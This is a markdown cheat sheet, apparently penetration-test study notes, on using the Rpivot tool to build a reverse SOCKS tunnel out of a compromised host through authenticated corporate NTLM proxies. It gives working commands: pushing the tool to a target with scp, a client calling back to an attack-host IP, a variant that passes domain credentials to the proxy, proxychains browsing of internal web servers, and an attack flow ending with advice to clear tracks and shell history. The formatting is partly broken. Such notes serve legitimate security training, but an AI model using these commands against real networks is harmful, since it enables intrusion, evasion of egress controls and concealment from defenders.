# 🛰️ Web Server Pivoting with Rpivot Cheat Sheet

> [!info] 🧠 What is Rpivot?
> 
> Bash
> 
> ```
> Python-based reverse SOCKS proxy utility custom-built to tunnel traffic out of highly restrictive corporate networks by authenticating through upstream enterprise HTTP/NTLM proxies.
> ```
> 
> 💡 Allows administrators and penetration testers to:
> 
> - **Defeat Enterprise Proxies:** Evade strict outbound packet blocks by wrapping pivot traffic in valid corporate web browsing structures.
>     
> - **Leverage Domain Credentials:** Authenticate directly with corporate proxy arrays using legitimate Windows Active Directory credentials.
>     
> - **Expose Intranet Sites:** Establish a stable reverse SOCKS pipeline to browse hidden internal web servers via standard local browsers.
>     
> 
> ✔ Common in:
> 
> - Hardened Active Directory perimeters, financial sector compliance assessments, and highly restricted proxy-enforced enterprise intranets.
>     

> [!tip] 🔧 Core Idea
> 
> Bash

```
> Local Browser (Proxychains) ↔ Rpivot Server (Port 9050) 🔋 (Port 9999 Master Gate) ⬅️ Rpivot Client (Target) ➔ Internal Web App
> ```
> 
> 💡 Key Operational Advantage:
> 
> - **Proxy-Aware Movement:** Standard reverse shells or SSH tunnels crash if they cannot navigate corporate NTLM proxies. Rpivot natively wraps its transport layer to blend in with authorized corporate web traffic.
>     
> 
> ✔ Think of it as **smuggling a data pipeline inside a standard web browsing session. Instead of fighting the company's central proxy gate, you feed Rpivot domain credentials, allowing it to "politely" ask the firewall to open the front door and connect back to your server**.

# 🌳 Structure: Server Binding & Authenticated Egress

> [!info] 📚 Staging the Master Server (Attack Host)
> 
> Bash
> 
> 
```

> # Start the server to manage the SOCKS bridge and incoming client gate
> 
> python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
> 
> ```
> 
> 💡 Function:
> 
> - Opens port `9999` to collect incoming reverse client connections, while publishing port `9050` locally as a standard functional SOCKS proxy interface for your tools.
>     
> ```

> [!tip] 📥 Executing the Client (Compromised Foothold)
> 
> Bash

```
> # 1. Transfer rpivot to the pivot target
> scp -r rpivot ubuntu@<Target_IP>:/home/ubuntu/
>
> # 2. Standard Unauthenticated Egress Connection
> python2 client.py --server-ip 10.10.14.18 --server-port 9999
> 
> # 3. Advanced Authenticated NTLM Enterprise Connection
> python client.py --server-ip <Attack_Host_IP> --server-port 8080 --ntlm-proxy-ip <Proxy_IP> --ntlm-proxy-port <Proxy_Port> --domain <Domain> --username <User> --password <Pass>
> ```
> 
> 💡 Logic:
> 
> - Automatically generates a reverse traffic pipeline out of the internal subnet. If the environment forces proxy authentication, it appends NTLM cryptographic challenge headers to sail past perimeter checks.
>     

# 🔐 Access Methods

|**Connection Type**|**Client Command Flag**|**Authentication Path**|**Primary Use Case**|
|---|---|---|---|
|**Standard Reverse**|Direct connection to Server IP|None (Direct outbound path open)|Basic network pivoting when general outbound communication is permitted.|
|**HTTP Proxy Relay**|`--ntlm-proxy-ip <IP>`|Anonymous proxy routing loop|Navigating baseline content filters or unauthenticated corporate web gateways.|
|**NTLM Domain Proxy**|`--domain` `--username` `--password`|Active Directory Domain Controller Validation|Bypassing "iron-curtain" firewalls that mandate valid domain user context for web traffic.|

# 🔍 Footprinting & Enumeration

> [!success] 📡 Activating and Driving the Reverse Web Bridge
> 
> Bash
> 
> 
```

> # 1. Verify the local Proxychains config points to your active Rpivot local proxy port (9050)
> 
> tail -1 /etc/proxychains.conf
> 
> # Expected: socks4 127.0.0.1 9050
> 
> # 2. Tunnel local browser traffic to view internal web apps
> 
> proxychains firefox-esr 172.16.5.135:80
> 
> ```
> 
> 💡 Execution & dependency requirements:
> 
> - **Legacy Engine:** Rpivot is natively built on **Python 2**. You must ensure a Python 2.7 runtime environment is present on both the attack computer and target deployment node.
>     
> - `New connection from host 10.129.202.64` confirms the master handshake is complete and the bridge is active.
>     
> ```

# ⚠️ Common Misconfigurations

> [!danger] 🔓 Deprecated Python Environments & Incorrect Proxy Port Mappings
> 
> Bash

```
> Binary Launch Failures: Attempting to invoke client scripts on modern hosts lacking Python 2 support packages
> Traffic Redirection Drops: Mapping proxychains to the master '--server-port' (9999) instead of the local '--proxy-port' (9050)
> ```
> 
> 💡 Impact:
> 
> - **Execution Script Crashes:** Because many modern Linux builds (and current OS versions in 2026) have removed Python 2, executing the script blindly will dump syntax or missing interpreter exceptions.
>     
> - **Tunnel Disconnections:** If you configure proxychains to send your tool traffic directly into the communication collection port (`9999`), the packet structure collides, dropping your session instantly.
>     

# ⚡ Real-World Workflow

> [!success] 🧠 Attack Flow
> 
> Bash
> 
> 
```

> 1. Compromise an internal host and note if direct outbound internet requests are being blocked.
>     
> 2. Identify active web proxy settings via system environment variables ('http_proxy').
>     
> 3. Start 'server.py' on your attack host to manage the SOCKS bridge (9050) and incoming gate (9999).
>     
> 4. Use SCP to push the 'rpivot' code onto the compromised target platform.
>     
> 5. Launch 'client.py' on the target, providing NTLM credentials if an enterprise proxy is present.
>     
> 6. Use 'proxychains' locally to browse internal portals or scan hidden web servers (e.g., 172.16.5.135).
>     
> 
> ```
> 
> 💡 Always clear your target folder tracks; ensure no cleartext Active Directory passwords remain in the remote shell history.
> ```

# 🧩 Mental Model

> [!quote] 🎯 Protocol Hierarchy
> 
> Bash

````
> rpivot server.py     → A secure, private landing dock built outside the company wall waiting for a shipment
> rpivot client.py     → An internal company delivery van driving out of the facility with valid papers
> NTLM/Proxy Flags     → Feeding the delivery driver the correct security badge to pass the gate guard
> Proxychains Browser  → Standing on the external dock and peering through the van's window to see the warehouse
> ```
> 
> 💡 When standard lateral tools hit a wall due to strict authenticated egress filtering, use Rpivot to turn the company's own authorization system into your tunnel pathway.
```</Pass></User></Domain></Proxy_Port></Proxy_IP></Attack_Host_IP></Target_IP>
````